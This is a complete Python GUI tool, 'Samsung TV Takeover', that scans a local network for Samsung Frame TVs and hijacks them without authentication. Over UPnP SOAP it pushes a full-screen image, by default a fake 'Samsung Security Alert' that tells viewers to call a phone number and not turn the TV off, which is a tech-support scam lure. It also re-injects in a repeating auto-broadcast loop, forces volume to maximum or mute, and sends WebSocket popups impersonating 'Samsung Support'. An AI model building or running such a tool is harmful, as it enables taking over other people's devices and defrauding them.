#!/usr/bin/env python3
"""
Samsung TV Takeover — GUI
One-click broadcast to all Samsung Frame TVs on the local network.
Samsung confirmed zero-auth on these ports is working as intended (PSIRT response 2026).
"""
import io, json, socket, threading, time, tkinter as tk, urllib.request
from tkinter import filedialog, scrolledtext, ttk

try:
    from PIL import Image, ImageDraw, ImageFont, ImageTk
    PIL_OK = True
except ImportError:
    PIL_OK = False

try:
    import websockets
    WS_OK = True
except ImportError:
    WS_OK = False

# ── helpers ──────────────────────────────────────────────────────────────────

AV_NS = "urn:schemas-upnp-org:service:AVTransport:1"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close(); return ip
    except Exception:
        return "127.0.0.1"

def probe(ip, timeout=0.6):
    for port in (9197, 8001):
        s = socket.socket(); s.settimeout(timeout)
        ok = s.connect_ex((ip, port)) == 0; s.close()
        if not ok: return False
    return True

def get_device_info(ip):
    try:
        r = urllib.request.urlopen(f"http://{ip}:8001/api/v2/", timeout=3)
        return json.loads(r.read())
    except Exception:
        return {}

def soap_call(ip, action, args, timeout=6):
    ctrl = f"http://{ip}:9197/upnp/control/AVTransport1"
    body = (
        f'<?xml version="1.0"?>'
        f'<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
        f's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        f'<s:Body><u:{action} xmlns:u="{AV_NS}">{args}</u:{action}></s:Body>'
        f'</s:Envelope>'
    ).encode()
    req = urllib.request.Request(ctrl, data=body, headers={
        "Content-Type": "text/xml; charset=utf-8",
        "SOAPAction": f'"{AV_NS}#{action}"',
    })
    try:
        return urllib.request.urlopen(req, timeout=timeout).status
    except urllib.request.HTTPError as e:
        return e.code
    except Exception as e:
        return str(e)

RC_NS = "urn:schemas-upnp-org:service:RenderingControl:1"

def get_volume(ip, timeout=4):
    ctrl = f"http://{ip}:9197/upnp/control/RenderingControl1"
    body = (
        '<?xml version="1.0"?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
        's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        f'<s:Body><u:GetVolume xmlns:u="{RC_NS}">'
        '<InstanceID>0</InstanceID><Channel>Master</Channel>'
        f'</u:GetVolume></s:Body></s:Envelope>'
    ).encode()
    req = urllib.request.Request(ctrl, data=body, headers={
        "Content-Type": "text/xml; charset=utf-8",
        "SOAPAction": f'"{RC_NS}#GetVolume"',
    })
    try:
        resp = urllib.request.urlopen(req, timeout=timeout).read().decode()
        import re
        m = re.search(r'<CurrentVolume>(\d+)</CurrentVolume>', resp)
        return int(m.group(1)) if m else None
    except Exception:
        return None

def set_volume(ip, level, timeout=4):
    level = max(0, min(100, level))
    ctrl = f"http://{ip}:9197/upnp/control/RenderingControl1"
    body = (
        '<?xml version="1.0"?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
        's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        f'<s:Body><u:SetVolume xmlns:u="{RC_NS}">'
        f'<InstanceID>0</InstanceID><Channel>Master</Channel>'
        f'<DesiredVolume>{level}</DesiredVolume>'
        f'</u:SetVolume></s:Body></s:Envelope>'
    ).encode()
    req = urllib.request.Request(ctrl, data=body, headers={
        "Content-Type": "text/xml; charset=utf-8",
        "SOAPAction": f'"{RC_NS}#SetVolume"',
    })
    try:
        return urllib.request.urlopen(req, timeout=timeout).status
    except urllib.request.HTTPError as e:
        return e.code
    except Exception as e:
        return str(e)

def inject_image(ip, url):
    didl = (
        f'&lt;DIDL-Lite xmlns="urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/" '
        f'xmlns:dc="http://purl.org/dc/elements/1.1/" '
        f'xmlns:upnp="urn:schemas-upnp-org:metadata-1-0/upnp/"&gt;'
        f'&lt;item id="1" parentID="0" restricted="1"&gt;'
        f'&lt;dc:title&gt;Broadcast&lt;/dc:title&gt;'
        f'&lt;upnp:class&gt;object.item.imageItem.photo&lt;/upnp:class&gt;'
        f'&lt;res protocolInfo="http-get:*:image/jpeg:*"&gt;{url}&lt;/res&gt;'
        f'&lt;/item&gt;&lt;/DIDL-Lite&gt;'
    )
    soap_call(ip, "Stop", "<InstanceID>0</InstanceID>")
    time.sleep(0.4)
    r = soap_call(ip, "SetAVTransportURI",
                  f"<InstanceID>0</InstanceID><CurrentURI>{url}</CurrentURI>"
                  f"<CurrentURIMetaData>{didl}</CurrentURIMetaData>")
    time.sleep(0.6)
    soap_call(ip, "Play", "<InstanceID>0</InstanceID><Speed>1</Speed>")
    return r

def find_font(size, bold=False):
    candidates = (
        ["C:/Windows/Fonts/arialbd.ttf", "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf"]
        if bold else
        ["C:/Windows/Fonts/arial.ttf", "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"]
    )
    for p in candidates:
        try: return ImageFont.truetype(p, size)
        except Exception: pass
    return ImageFont.load_default()

def build_default_image(phone="000-000-0000"):
    W, H = 1920, 1080
    img = Image.new("RGB", (W, H), (8, 8, 15))
    draw = ImageDraw.Draw(img)
    draw.rectangle([0, 0, W, 130], fill=(190, 0, 0))
    f1 = find_font(62, bold=True)
    msg = "WARNING: YOUR SAMSUNG TV HAS BEEN COMPROMISED"
    b = draw.textbbox((0,0), msg, font=f1)
    draw.text(((W-b[2]+b[0])//2, 22), msg, fill=(255,255,255), font=f1)
    f2 = find_font(200, bold=True)
    b = draw.textbbox((0,0), phone, font=f2)
    draw.text(((W-b[2]+b[0])//2, 160), phone, fill=(255,220,0), font=f2)
    f3 = find_font(52)
    for y, line in [
        (470, "Call NOW to secure your TV and home network."),
        (540, "Your WiFi password and connected devices are exposed."),
        (610, "Do NOT turn off your TV until you call."),
    ]:
        b = draw.textbbox((0,0), line, font=f3)
        draw.text(((W-b[2]+b[0])//2, y), line, fill=(200,200,200), font=f3)
    draw.rectangle([0, H-90, W, H], fill=(190, 0, 0))
    f4 = find_font(38)
    foot = f"Samsung Security Alert  |  Call: {phone}  |  Do not dismiss this screen"
    b = draw.textbbox((0,0), foot, font=f4)
    draw.text(((W-b[2]+b[0])//2, H-65), foot, fill=(255,255,255), font=f4)
    buf = io.BytesIO(); img.save(buf, "JPEG", quality=93)
    return buf.getvalue()

def load_image_file(path):
    with open(path, "rb") as f: return f.read()

# ── HTTP image server ────────────────────────────────────────────────────────

class ImageServer:
    def __init__(self):
        self.data = b""
        self._port = 8779
        self._host = get_local_ip()

    def set_image(self, data): self.data = data
    def url(self): return f"http://{self._host}:{self._port}/image.jpg"

    def start(self):
        def serve():
            srv = socket.socket()
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", self._port))
            srv.listen(50)
            while True:
                try:
                    srv.settimeout(1)
                    conn, _ = srv.accept()
                    threading.Thread(target=self._handle, args=(conn,), daemon=True).start()
                except Exception: pass
        threading.Thread(target=serve, daemon=True).start()

    def _handle(self, conn):
        try:
            conn.recv(4096)
            conn.sendall(
                b"HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\n"
                + f"Content-Length: {len(self.data)}\r\nConnection: close\r\n\r\n".encode()
                + self.data
            )
        except Exception: pass
        finally: conn.close()

# ── GUI ──────────────────────────────────────────────────────────────────────

class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Samsung Frame-ous")
        self.configure(bg="#0e0e1a")
        self.resizable(True, True)

        self._srv = ImageServer()
        self._srv.start()
        self._running = False
        self._scanning = False
        self._stop_evt = threading.Event()
        self._found_tvs = {}   # ip -> display name
        self._image_data = None

        self._build_ui()
        self._load_default_image()

    def _build_ui(self):
        PAD = 10
        CARD = "#1a1a2e"
        ACC = "#e50000"
        FG = "#e0e0e0"

        style = ttk.Style(self)
        style.theme_use("clam")
        style.configure("TFrame", background=CARD)
        style.configure("TLabel", background=CARD, foreground=FG, font=("Consolas", 10))
        style.configure("TEntry", fieldbackground="#252540", foreground=FG, font=("Consolas", 10))
        style.configure("Red.TButton", background=ACC, foreground="white",
                        font=("Consolas", 11, "bold"))
        style.map("Red.TButton", background=[("active", "#c00000")])
        style.configure("Green.TButton", background="#1a6e1a", foreground="white",
                        font=("Consolas", 11, "bold"))
        style.map("Green.TButton", background=[("active", "#145014")])
        style.configure("Gray.TButton", background="#333355", foreground=FG,
                        font=("Consolas", 10))
        style.map("Gray.TButton", background=[("active", "#444466")])
        style.configure("TV.Treeview", background="#0f0f20", foreground="#b0ffb0",
                        fieldbackground="#0f0f20", font=("Consolas", 10), rowheight=22)
        style.configure("TV.Treeview.Heading", background="#1a1a2e", foreground=ACC,
                        font=("Consolas", 9, "bold"))

        # ── title bar ────────────────────────────────────────────────────
        top = ttk.Frame(self, padding=(PAD, 6))
        top.pack(fill="x")
        ttk.Label(top, text="SAMSUNG  FRAME-OUS", font=("Consolas", 16, "bold"),
                  foreground=ACC).pack(side="left")
        self._lbl_myip = ttk.Label(top, text=f"Your IP: {self._srv._host}",
                                   font=("Consolas", 9), foreground="#666")
        self._lbl_myip.pack(side="right")

        # ── main body: left controls | right log ─────────────────────────
        body = ttk.Frame(self, padding=PAD)
        body.pack(fill="both", expand=True)
        body.columnconfigure(0, minsize=300, weight=0)
        body.columnconfigure(1, weight=1)
        body.rowconfigure(0, weight=1)

        left = ttk.Frame(body, padding=(0, 0, PAD, 0))
        left.grid(row=0, column=0, sticky="nsew")

        right = ttk.Frame(body, padding=0)
        right.grid(row=0, column=1, sticky="nsew")
        right.rowconfigure(1, weight=1)

        # ── NETWORK ──────────────────────────────────────────────────────
        self._section(left, "NETWORK")
        nf = ttk.Frame(left); nf.pack(fill="x", pady=(2, 8))
        ttk.Label(nf, text="Subnet:").pack(side="left")
        self._subnet_var = tk.StringVar(value=".".join(self._srv._host.split(".")[:3]))
        ttk.Entry(nf, textvariable=self._subnet_var, width=14).pack(side="left", padx=4)
        ttk.Label(nf, text="Interval(s):").pack(side="left", padx=(8, 0))
        self._interval_var = tk.StringVar(value="15")
        ttk.Entry(nf, textvariable=self._interval_var, width=5).pack(side="left", padx=4)

        # ── SCAN + AUTO controls ──────────────────────────────────────────
        self._section(left, "SCAN")
        sf = ttk.Frame(left); sf.pack(fill="x", pady=(2, 6))
        self._btn_scan = ttk.Button(sf, text="🔍  Scan Now", style="Gray.TButton",
                                    command=self._scan_once, width=14)
        self._btn_scan.pack(side="left", padx=(0, 6))
        self._btn_start = ttk.Button(sf, text="▶  Auto Broadcast", style="Green.TButton",
                                     command=self._start, width=18)
        self._btn_start.pack(side="left", padx=(0, 6))
        self._btn_stop = ttk.Button(sf, text="■  Stop", style="Gray.TButton",
                                    command=self._stop, width=8, state="disabled")
        self._btn_stop.pack(side="left")

        # ── FOUND TVs list ────────────────────────────────────────────────
        self._section(left, "FOUND TVs")
        tv_frame = ttk.Frame(left); tv_frame.pack(fill="both", expand=True, pady=(2, 8))
        cols = ("IP", "Name", "Model")
        self._tv_tree = ttk.Treeview(tv_frame, columns=cols, show="headings",
                                     style="TV.Treeview", height=6)
        for col, w in zip(cols, (110, 130, 130)):
            self._tv_tree.heading(col, text=col)
            self._tv_tree.column(col, width=w, anchor="w")
        vsb = ttk.Scrollbar(tv_frame, orient="vertical", command=self._tv_tree.yview)
        self._tv_tree.configure(yscrollcommand=vsb.set)
        self._tv_tree.pack(side="left", fill="both", expand=True)
        vsb.pack(side="right", fill="y")

        # right-click and selection bindings
        self._tv_tree.bind("<Button-3>", self._tv_context_menu)
        self._tv_tree.bind("<<TreeviewSelect>>", self._on_tv_select)

        inject_all_f = ttk.Frame(left); inject_all_f.pack(fill="x", pady=(0, 4))
        ttk.Button(inject_all_f, text="📡  Inject All Found TVs", style="Red.TButton",
                   command=self._inject_all_found).pack(fill="x")

        # ── VOLUME ────────────────────────────────────────────────────────
        vf = ttk.Frame(left); vf.pack(fill="x", pady=(2, 8))
        ttk.Label(vf, text="Vol:").pack(side="left")
        ttk.Button(vf, text="−−", style="Gray.TButton", width=4,
                   command=lambda: self._vol_step(-10)).pack(side="left", padx=2)
        ttk.Button(vf, text="−", style="Gray.TButton", width=3,
                   command=lambda: self._vol_step(-5)).pack(side="left", padx=2)
        self._vol_label = ttk.Label(vf, text="--", width=4, foreground="#b0ffb0",
                                    font=("Consolas", 10, "bold"))
        self._vol_label.pack(side="left", padx=4)
        ttk.Button(vf, text="+", style="Gray.TButton", width=3,
                   command=lambda: self._vol_step(5)).pack(side="left", padx=2)
        ttk.Button(vf, text="++", style="Gray.TButton", width=4,
                   command=lambda: self._vol_step(10)).pack(side="left", padx=2)
        ttk.Button(vf, text="MAX", style="Red.TButton", width=5,
                   command=lambda: self._vol_set(100)).pack(side="left", padx=(6, 2))
        ttk.Button(vf, text="MUTE", style="Gray.TButton", width=5,
                   command=lambda: self._vol_set(0)).pack(side="left", padx=2)

        # ── IMAGE ─────────────────────────────────────────────────────────
        self._section(left, "BROADCAST IMAGE")
        self._img_lbl = ttk.Label(left, text="[default alert image]",
                                  foreground="#aaa", wraplength=280)
        self._img_lbl.pack(anchor="w")

        if PIL_OK:
            self._preview_lbl = tk.Label(left, bg="#0a0a14", bd=1, relief="sunken")
            self._preview_lbl.pack(pady=4, fill="x")
        else:
            self._preview_lbl = None

        ibf = ttk.Frame(left); ibf.pack(fill="x", pady=2)
        ttk.Button(ibf, text="Browse…", style="Gray.TButton",
                   command=self._browse_image).pack(side="left", padx=(0, 4))
        ttk.Button(ibf, text="Use Default", style="Gray.TButton",
                   command=self._load_default_image).pack(side="left")

        pf = ttk.Frame(left); pf.pack(fill="x", pady=(4, 0))
        ttk.Label(pf, text="Phone #:").pack(side="left")
        self._phone_var = tk.StringVar(value="000-000-0000")
        ttk.Entry(pf, textvariable=self._phone_var, width=15).pack(side="left", padx=4)
        ttk.Button(pf, text="Rebuild", style="Gray.TButton",
                   command=self._load_default_image).pack(side="left")

        # ── MANUAL TARGET ─────────────────────────────────────────────────
        self._section(left, "MANUAL TARGET")
        mf = ttk.Frame(left); mf.pack(fill="x", pady=(2, 4))
        self._manual_ip = tk.StringVar()
        ttk.Entry(mf, textvariable=self._manual_ip, width=16).pack(side="left", padx=(0, 4))
        ttk.Button(mf, text="Inject", style="Gray.TButton",
                   command=self._manual_inject).pack(side="left")

        # ── NAMED POPUP ───────────────────────────────────────────────────
        self._section(left, "NAMED POPUP  (WebSocket)")
        ppf = ttk.Frame(left); ppf.pack(fill="x", pady=(2, 4))
        self._popup_ip = tk.StringVar()
        ttk.Entry(ppf, textvariable=self._popup_ip, width=15,
                  ).pack(side="left", padx=(0, 4))
        self._popup_name = tk.StringVar(value="Samsung Support")
        ttk.Entry(ppf, textvariable=self._popup_name, width=18).pack(side="left", padx=(0, 4))
        ttk.Button(ppf, text="Send", style="Gray.TButton",
                   command=self._send_popup).pack(side="left")

        # ── RIGHT: LOG ────────────────────────────────────────────────────
        ttk.Label(right, text="LOG", foreground=ACC,
                  font=("Consolas", 9, "bold")).grid(row=0, column=0, sticky="w")
        self._log = scrolledtext.ScrolledText(
            right, bg="#0a0a14", fg="#b0ffb0", font=("Consolas", 9),
            state="disabled", relief="flat", bd=0)
        self._log.grid(row=1, column=0, sticky="nsew")
        right.columnconfigure(0, weight=1)

        # ── STATUS BAR ────────────────────────────────────────────────────
        bot = ttk.Frame(self, padding=(PAD, 3))
        bot.pack(fill="x")
        self._status_var = tk.StringVar(value="Ready — hit Scan Now or Auto Broadcast")
        ttk.Label(bot, textvariable=self._status_var,
                  foreground="#666", font=("Consolas", 9)).pack(side="left")
        self._tv_count_var = tk.StringVar(value="TVs found: 0")
        ttk.Label(bot, textvariable=self._tv_count_var, foreground=ACC,
                  font=("Consolas", 9, "bold")).pack(side="right")

    def _section(self, parent, title):
        ttk.Label(parent, text=title, foreground="#e50000",
                  font=("Consolas", 9, "bold")).pack(anchor="w", pady=(8, 1))

    # ── image helpers ─────────────────────────────────────────────────────────

    def _load_default_image(self):
        if not PIL_OK:
            self._log_write("[!] Pillow not installed — pip install pillow\n"); return
        phone = self._phone_var.get() if hasattr(self, "_phone_var") else "000-000-0000"
        data = build_default_image(phone=phone)
        self._image_data = data
        self._srv.set_image(data)
        if hasattr(self, "_img_lbl"):
            self._img_lbl.config(text="[default alert image]")
        self._update_preview(data)
        self._log_write(f"[*] Default image loaded ({len(data):,} bytes)\n")

    def _browse_image(self):
        path = filedialog.askopenfilename(
            title="Select image",
            filetypes=[("Images", "*.jpg *.jpeg *.png *.bmp"), ("All", "*.*")])
        if not path: return
        try:
            with open(path, "rb") as f: raw = f.read()
            if PIL_OK and not path.lower().endswith((".jpg", ".jpeg")):
                img = Image.open(io.BytesIO(raw)).convert("RGB")
                buf = io.BytesIO(); img.save(buf, "JPEG", quality=93); raw = buf.getvalue()
            self._image_data = raw
            self._srv.set_image(raw)
            self._img_lbl.config(text=path.split("/")[-1].split("\\")[-1])
            self._update_preview(raw)
            self._log_write(f"[*] Loaded: {path} ({len(raw):,} bytes)\n")
        except Exception as e:
            self._log_write(f"[!] Failed to load image: {e}\n")

    def _update_preview(self, data):
        if not PIL_OK or self._preview_lbl is None: return
        try:
            img = Image.open(io.BytesIO(data)); img.thumbnail((280, 158))
            photo = ImageTk.PhotoImage(img)
            self._preview_lbl.config(image=photo); self._preview_lbl.image = photo
        except Exception: pass

    # ── scan ──────────────────────────────────────────────────────────────────

    def _scan_once(self):
        if self._scanning:
            self._log_write("[!] Scan already running.\n"); return
        self._scanning = True
        self._btn_scan.config(state="disabled")
        self._status_var.set("Scanning…")
        self._log_write(f"[*] Scanning {self._subnet_var.get()}.0/24...\n")
        threading.Thread(target=self._do_scan, daemon=True).start()

    def _do_scan(self, inject_after=False):
        subnet = self._subnet_var.get()
        found = {}
        lock = threading.Lock()

        def check(i):
            ip = f"{subnet}.{i}"
            if probe(ip):
                info = get_device_info(ip)
                name = info.get("device", {}).get("name", "Samsung TV")
                model = info.get("device", {}).get("modelName", "")
                with lock:
                    found[ip] = (name, model)
                    self._log_write(f"  [FOUND] {ip}  {name}  {model}\n")

        threads = [threading.Thread(target=check, args=(i,), daemon=True) for i in range(1, 255)]
        for t in threads: t.start()
        for t in threads: t.join()

        self._found_tvs = found
        self.after(0, self._refresh_tv_list)
        self._log_write(f"[*] Scan done — {len(found)} TV(s) found.\n")
        self._scanning = False
        self.after(0, lambda: self._btn_scan.config(state="normal"))
        self.after(0, lambda: self._status_var.set(
            f"Scan complete — {len(found)} TV(s) found"))

        if inject_after and found:
            for ip in found:
                self._log_write(f"  [->] Injecting {ip}...\n")
                r = inject_image(ip, self._srv.url())
                self._log_write(f"  [{'OK' if str(r) in ('200','204') else 'FAIL'}] {ip}: {r}\n")

        return found

    def _refresh_tv_list(self):
        self._tv_tree.delete(*self._tv_tree.get_children())
        for ip, (name, model) in self._found_tvs.items():
            self._tv_tree.insert("", "end", values=(ip, name, model))
        self._tv_count_var.set(f"TVs found: {len(self._found_tvs)}")

    def _on_tv_select(self, event=None):
        ip = self._get_selected_ip()
        if not ip: return
        self._vol_label.config(text="...")
        def run():
            v = get_volume(ip)
            self.after(0, lambda: self._vol_label.config(
                text=str(v) if v is not None else "--"))
        threading.Thread(target=run, daemon=True).start()

    def _get_selected_ip(self):
        sel = self._tv_tree.selection()
        if not sel: return None
        return self._tv_tree.item(sel[0], "values")[0]

    def _vol_step(self, delta):
        ip = self._get_selected_ip()
        if not ip:
            self._log_write("[!] Select a TV from the list first.\n"); return
        def run():
            current = get_volume(ip)
            if current is None:
                self._log_write(f"  [!] Couldn't read volume from {ip}\n"); return
            new_vol = max(0, min(100, current + delta))
            r = set_volume(ip, new_vol)
            self._log_write(f"  [VOL] {ip}: {current} → {new_vol} ({r})\n")
            self.after(0, lambda: self._vol_label.config(text=str(new_vol)))
        threading.Thread(target=run, daemon=True).start()

    def _vol_set(self, level):
        ip = self._get_selected_ip()
        if not ip:
            self._log_write("[!] Select a TV from the list first.\n"); return
        def run():
            r = set_volume(ip, level)
            self._log_write(f"  [VOL] {ip}: → {level} ({r})\n")
            self.after(0, lambda: self._vol_label.config(text=str(level)))
        threading.Thread(target=run, daemon=True).start()

    def _tv_context_menu(self, event):
        row = self._tv_tree.identify_row(event.y)
        if not row: return
        self._tv_tree.selection_set(row)
        ip = self._tv_tree.item(row, "values")[0]
        menu = tk.Menu(self, tearoff=0, bg="#1a1a2e", fg="#e0e0e0",
                       activebackground="#e50000", activeforeground="white")
        menu.add_command(label=f"Inject image → {ip}",
                         command=lambda: self._inject_one(ip))
        menu.add_command(label=f"Send popup → {ip}",
                         command=lambda: self._popup_ip.set(ip))
        menu.add_command(label=f"Copy IP",
                         command=lambda: (self.clipboard_clear(), self.clipboard_append(ip)))
        menu.tk_popup(event.x_root, event.y_root)

    # ── inject ────────────────────────────────────────────────────────────────

    def _inject_all_found(self):
        if not self._found_tvs:
            self._log_write("[!] No TVs found yet — run Scan first.\n"); return
        if not self._image_data:
            self._log_write("[!] Load an image first.\n"); return
        def run():
            for ip in list(self._found_tvs):
                self._log_write(f"  [->] Injecting {ip}...\n")
                r = inject_image(ip, self._srv.url())
                self._log_write(f"  [{'OK' if str(r) in ('200','204') else 'FAIL'}] {ip}: {r}\n")
        threading.Thread(target=run, daemon=True).start()

    def _inject_one(self, ip):
        if not self._image_data:
            self._log_write("[!] Load an image first.\n"); return
        def run():
            self._log_write(f"  [->] Injecting {ip}...\n")
            r = inject_image(ip, self._srv.url())
            self._log_write(f"  [{'OK' if str(r) in ('200','204') else 'FAIL'}] {ip}: {r}\n")
        threading.Thread(target=run, daemon=True).start()

    def _manual_inject(self):
        ip = self._manual_ip.get().strip()
        if not ip:
            self._log_write("[!] Enter a target IP.\n"); return
        if not self._image_data:
            self._log_write("[!] Load an image first.\n"); return
        self._inject_one(ip)

    # ── auto broadcast loop ───────────────────────────────────────────────────

    def _start(self):
        if self._running: return
        if not self._image_data:
            self._log_write("[!] Load an image first.\n"); return
        self._running = True
        self._stop_evt.clear()
        self._btn_start.config(state="disabled")
        self._btn_stop.config(state="normal")
        self._status_var.set("Auto Broadcast running…")
        threading.Thread(target=self._run_loop, daemon=True).start()

    def _stop(self):
        self._stop_evt.set()
        self._running = False
        self._btn_start.config(state="normal")
        self._btn_stop.config(state="disabled")
        self._status_var.set("Stopped.")
        self._log_write("[*] Auto Broadcast stopped.\n")

    def _run_loop(self):
        try:
            interval = int(self._interval_var.get())
        except Exception:
            interval = 15
        injected_at = {}
        sweep = 0
        while not self._stop_evt.is_set():
            sweep += 1
            self._log_write(f"\n[*] Sweep #{sweep} — scanning...\n")
            self._scanning = True
            found = self._do_scan(inject_after=False)
            self._scanning = False
            for ip in found:
                if self._stop_evt.is_set(): break
                if time.time() - injected_at.get(ip, 0) < 300: continue
                injected_at[ip] = time.time()
                self._log_write(f"  [->] Injecting {ip}...\n")
                r = inject_image(ip, self._srv.url())
                self._log_write(
                    f"  [{'OK' if str(r) in ('200','204') else 'FAIL'}] {ip}: {r}\n")
            if not self._stop_evt.is_set():
                self._log_write(f"[*] Next sweep in {interval}s...\n")
                self._stop_evt.wait(timeout=interval)

    # ── named popup ───────────────────────────────────────────────────────────

    def _send_popup(self):
        if not WS_OK:
            self._log_write("[!] websockets not installed — pip install websockets\n"); return
        import asyncio, base64
        ip = self._popup_ip.get().strip()
        name = self._popup_name.get().strip() or "Samsung Support"
        if not ip:
            self._log_write("[!] Enter a target IP for the popup.\n"); return
        self._log_write(f"[->] Sending popup '{name}' to {ip}...\n")

        async def do_popup():
            import websockets as ws_mod
            encoded = base64.b64encode(name.encode()).decode()
            uri = (f"ws://{ip}:8001/api/v2?name={encoded}"
                   f"&token=&appId=com.samsung.app&deviceName={encoded}")
            try:
                async with ws_mod.connect(uri, open_timeout=8) as ws:
                    msg = await asyncio.wait_for(ws.recv(), timeout=10)
                    data = json.loads(msg)
                    event = data.get("event", "")
                    if "connect" in event or "touchEnable" in event:
                        self._log_write(f"  [OK] Popup '{name}' showing on TV\n")
                    elif "timeout" in event.lower():
                        self._log_write(f"  [OK] Popup shown — timed out (not accepted)\n")
                    else:
                        self._log_write(f"  [WS] {event}\n")
                    await asyncio.sleep(30)
            except Exception as e:
                self._log_write(f"  [WS] {e}\n")

        threading.Thread(target=lambda: asyncio.run(do_popup()), daemon=True).start()

    # ── log ───────────────────────────────────────────────────────────────────

    def _log_write(self, text):
        def _do():
            self._log.config(state="normal")
            self._log.insert("end", text)
            self._log.see("end")
            self._log.config(state="disabled")
        self.after(0, _do)


if __name__ == "__main__":
    app = App()
    app.geometry("1020x720")
    app.mainloop()
